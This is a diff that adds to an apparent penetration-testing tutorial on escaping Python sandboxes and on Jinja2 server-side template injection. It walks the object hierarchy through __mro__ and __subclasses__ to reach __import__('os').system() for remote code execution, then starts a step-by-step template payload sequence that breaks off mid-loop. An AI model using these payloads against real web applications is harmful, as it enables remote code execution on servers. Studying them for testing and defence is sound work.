@@ -22,4 +22,32 @@ def searchfunc(name):
 searchfunc('warning')
 ```
 The reason we are searching for `warning` is because, this class imports Python's `sys` module, and from `sys`, we can reach the `os` module.
-3. We will now attempt to reach the `import`
+3. We will now attempt to reach the `import` by walking through the hierarchy.
+```python
+x = s.__class__.mro()[1].__subclasses__()
+y = x[VALUE] # Note: Replace "VALUE" with the actual integer result from searchfunc
+
+z = y()._module.__builtins__
+for i in z:
+	if i.find('import') > -1:
+		print(i, z[i])
+```
+4. Test for RCE
+```python
+y()._module.__builtins__['__import__']('os').system('echo RCE')
+```
+## Custom Jinja2 Payload
+We can replicate the steps above to achieve RCE using custom payload in Jinja template.
+
+1. To test, we can start with the following payload
+```python
+{{ ''.__class__.__mro__ }}
+```
+2. Once confirmed, show all subclasses.
+```python
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+```
+3. To make step 2 easier, we can just craft a for loop to put index on all subclasses.
+```python
+{% for i in range() %}
+```
